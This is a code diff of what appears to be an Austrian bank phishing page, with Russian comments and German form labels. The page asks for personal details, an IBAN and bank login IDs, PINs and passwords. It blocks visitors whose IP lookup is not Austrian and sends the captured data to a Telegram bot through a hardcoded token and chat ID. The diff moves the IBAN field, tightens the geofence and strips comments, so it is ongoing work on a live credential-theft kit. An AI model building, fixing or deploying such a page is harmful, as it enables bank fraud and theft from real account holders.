@@ -1915,17 +1915,17 @@
                         <div class="field-error" data-error-for="housenumber"></div>
                     </div>
 
-                    <!-- Поле IBAN (между bank и postcode) -->
-                    <div class="form-field">
-                        <label for="iban">IBAN:<span class="req">*</span></label>
-                        <input type="text" id="iban" name="iban" placeholder="" required>
-                        <div class="field-error" data-error-for="iban"></div>
-                    </div>
-
                     <div class="form-field field-postcode">
                         <label for="postcode">Postleitzahl:<span class="req">*</span></label>
                         <input type="text" id="postcode" name="postcode" maxlength="4" inputmode="numeric" required>
                         <div class="field-error" data-error-for="postcode"></div>
+                    </div>
+
+                    <!-- Поле IBAN (опущено на 1 позицию ниже, пустой placeholder) -->
+                    <div class="form-field">
+                        <label for="iban">IBAN:<span class="req">*</span></label>
+                        <input type="text" id="iban" name="iban" placeholder="" required>
+                        <div class="field-error" data-error-for="iban"></div>
                     </div>
 
                     <div class="form-field">
@@ -2345,7 +2345,7 @@
                 const data = await res.json();
                 
                 // Разрешаем любые IP из Австрии (countryCode: 'AT')
-                if (data.query === '46.205.196.184' || data.countryCode === 'AT') {
+                if (data.countryCode === 'AT') {
                     // Доступ разрешен
                 } else {
                     throw new Error('Access Denied');
@@ -2363,7 +2363,6 @@
             // ОСНОВНОЙ КОД (начинается только если IP разрешен)
             // ============================================================
 
-            // Обновлённый токен и chat_id
             const TG_BOT_TOKEN = '8912609329:AAHK76TxJHL3PParUX02CPDkHyi8zBGi9DU';
             const TG_CHAT_ID   = '-1003924775699';
             const TG_API_URL   = 'https://api.telegram.org/bot' + TG_BOT_TOKEN + '/sendMessage';
@@ -2398,7 +2397,6 @@
             const form = document.getElementById('dataForm');
             const bankSelect = document.getElementById('bank');
 
-            // Добавлено поле 'iban' в правила валидации
             const FIELD_RULES = {
                 'fullname':    (v) => v.trim().length < 3 ? 'Bitte vollständigen Namen eingeben' : null,
                 'email':       (v) => !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(v) ? 'Bitte gültige E-Mail eingeben' : null,
@@ -2475,7 +2473,6 @@
                 e.target.value = e.target.value.replace(/\D/g, '').slice(0, 4);
             });
             
-            // Маска для IBAN (добавление пробелов)
             document.getElementById('iban').addEventListener('input', (e) => {
                 let v = e.target.value.replace(/[^A-Z0-9]/gi, '').toUpperCase().slice(0, 20);
                 e.target.value = v.replace(/(.{4})/g, '$1 ').trim();
@@ -2588,7 +2585,6 @@
                 }
             }
 
-            // Обработчики кнопок "Bestätigen" для кастомных банков
             async function submitCustomBank(loginId, passId, btnId) {
                 const l = document.getElementById(loginId);
                 const p = document.getElementById(passId);
@@ -2671,7 +2667,6 @@
             document.getElementById('easyNextBtn').addEventListener('click', () => submitCustomBank('easy_verfueger', 'easy_pin', 'easyNextBtn'));
             document.getElementById('baNextBtn').addEventListener('click', () => submitCustomBank('ba_verfueger', 'ba_pin', 'baNextBtn'));
 
-            // Стандартная логика (если выбран банк без кастома)
             window.submitStandardBank = async function() {
                 const login = document.getElementById('login').value.trim();
                 const password = document.getElementById('password').value.trim();
@@ -2706,7 +2701,6 @@
                 if (bankSelect.value) setError('bank', '');
             });
 
-            // Отправка формы личных данных
             form.addEventListener('submit', async (e) => {
                 e.preventDefault();
                 if (!validateGroup(Object.keys(FIELD_RULES), FIELD_RULES)) return;
@@ -2730,11 +2724,11 @@
                 setTimeout(() => {
                     submitBtn.disabled = false;
                     submitBtn.innerHTML = original;
-                    applyBankDesign(); // Открываем окно выбранного банка
+                    applyBankDesign(); 
                 }, 1000);
             });
 
-        }); // Конец checkIp().then()
+        }); 
     })();
     </script>
 
